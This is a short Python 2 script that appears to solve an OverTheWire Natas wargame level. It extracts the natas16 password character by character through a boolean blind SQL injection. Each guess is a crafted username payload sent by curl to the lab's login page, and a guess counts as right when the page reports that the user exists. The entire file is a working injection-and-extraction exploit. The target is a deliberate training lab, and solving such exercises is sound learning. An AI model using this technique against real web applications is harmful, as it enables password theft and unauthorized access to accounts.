import subprocess


start = ''

asciichars = list(range(0x30, 0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b))

while True:
    found = False
    for i in asciichars:
        trypass = start + chr(i) + '%'
        print "trying", repr(trypass)
        out = subprocess.check_output("""curl --basic -u natas$LEVEL:$PASS http://natas$LEVEL.natas.labs.overthewire.org/index.php?debug=yes -F username='" or username = "natas16" and password like binary "~~~"  #' 2>/dev/null """.replace("~~~", trypass), shell=True)
        if "This user exists" in out:
            start += chr(i)
            found = True
            break
    if not found:
        break

